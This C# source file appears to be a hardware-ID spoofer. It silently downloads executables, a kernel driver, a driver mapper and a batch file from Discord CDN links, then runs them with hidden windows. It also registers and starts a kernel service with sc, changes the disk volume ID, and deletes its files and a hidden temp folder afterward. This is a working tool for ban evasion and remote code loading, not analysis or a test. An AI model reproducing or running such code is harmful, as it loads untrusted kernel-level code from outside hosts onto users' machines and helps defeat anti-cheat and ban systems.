using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Threading;

namespace HardDrive
{
	internal class Diskdrive
	{
		public static void DiskdriveSpoof()
		{
			Diskdrive.ExecuteCommand("sc create Win32x64_0 binPath= C:\\Windows\\zxEsdMeYxazy.dat type= kernel");
			Thread.Sleep(600);
			Diskdrive.ExecuteCommand("sc start Win32x64_0");
			Diskdrive.ExecuteCommand("sc stop Win32x64_0");
			Diskdrive.ExecuteCommand("sc delete Win32x64_0");
			File.Delete("C:\\Windows\\zxEsdMeYxazy.dat");
		}

		public static void DownloadDriver()
		{
			WebClient webClient = new WebClient();
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/614402516381204485/622366670987591690/zxEsdMeYxazy.dat", "C:\\Windows\\zxEsdMeYxazy.dat");
			webClient.Proxy = null;
		}

		public static void VolumeID()
		{
			if (File.Exists("C:\\Windows\\System32\\wbem\\Volumeid.exe"))
			{
				Random random = new Random();
				string str = random.Next(1000, 9999).ToString() + "-" + random.Next(1000, 9999).ToString();
				Process process = new Process();
				process.StartInfo.RedirectStandardInput = true;
				process.StartInfo.UseShellExecute = false;
				process.StartInfo.CreateNoWindow = true;
				process.StartInfo.FileName = "cmd.exe";
				process.Start();
				process.StandardInput.WriteLine("cd C:\\Windows\\System32\\wbem");
				process.StandardInput.WriteLine("volumeid C: " + str);
				Thread.Sleep(1000);
				process.Close();
				string path = "C:\\Users\\Default\\AppData\\Local\\Temp\\Chache";
				if (!Directory.Exists(path))
				{
					DirectoryInfo directoryInfo = Directory.CreateDirectory(path);
					directoryInfo.Attributes = (FileAttributes.Hidden | FileAttributes.Directory);
				}
				WebClient webClient = new WebClient();
				webClient.DownloadFile("https://cdn.discordapp.com/attachments/721095799295049832/775058703711076393/kdmappernew.exe", "C:\\Users\\Default\\AppData\\Local\\Temp\\Chache\\MapperSpoofy.exe");
				WebClient webClient2 = new WebClient();
				webClient2.DownloadFile("https://cdn.discordapp.com/attachments/698964774096076833/698965464293965944/Spoofy.sys", "C:\\Users\\Default\\AppData\\Local\\Temp\\Chache\\Spoofy.sys");
				WebClient webClient3 = new WebClient();
				webClient3.DownloadFile("https://cdn.discordapp.com/attachments/698964774096076833/698965490596315306/load.bat", "C:\\Users\\Default\\AppData\\Local\\Temp\\Chache\\load.bat");
				new WebClient();
				Thread.Sleep(1000);
				Process.Start(new ProcessStartInfo("C:\\Users\\Default\\AppData\\Local\\Temp\\Chache\\load.bat")
				{
					WindowStyle = ProcessWindowStyle.Hidden
				});
				Thread.Sleep(1000);
				foreach (Process process2 in Process.GetProcessesByName("MapperSpoofy.exe"))
				{
					process2.Kill();
				}
				Directory.Delete("C: \\Users\\Default\\AppData\\Local\\Temp\\Chache", true);
			}
			else
			{
				Thread.Sleep(4700);
				WebClient webClient4 = new WebClient();
				webClient4.DownloadFile("https://cdn.discordapp.com/attachments/614402516381204485/616996464630956053/Volumeid.exe", "C:\\Windows\\System32\\wbem\\Volumeid.exe");
				webClient4.Proxy = null;
				Random random2 = new Random();
				string str2 = random2.Next(1000, 9999).ToString() + "-" + random2.Next(1000, 9999).ToString();
				Process process3 = new Process();
				process3.StartInfo.RedirectStandardInput = true;
				process3.StartInfo.UseShellExecute = false;
				process3.StartInfo.CreateNoWindow = true;
				process3.StartInfo.FileName = "cmd.exe";
				process3.Start();
				process3.StandardInput.WriteLine("cd C:\\Windows\\System32\\wbem");
				process3.StandardInput.WriteLine("volumeid C: " + str2);
				Thread.Sleep(1500);
				process3.Close();
			}
		}

		private static void ExecuteCommand(string command)
		{
			Process process = Process.Start(new ProcessStartInfo("cmd.exe", "/c " + command)
			{
				CreateNoWindow = true,
				UseShellExecute = false,
				RedirectStandardError = true,
				RedirectStandardOutput = true
			});
			process.WaitForExit();
			process.StandardOutput.ReadToEnd();
			process.StandardError.ReadToEnd();
			int exitCode = process.ExitCode;
			process.Close();
		}
	}
}
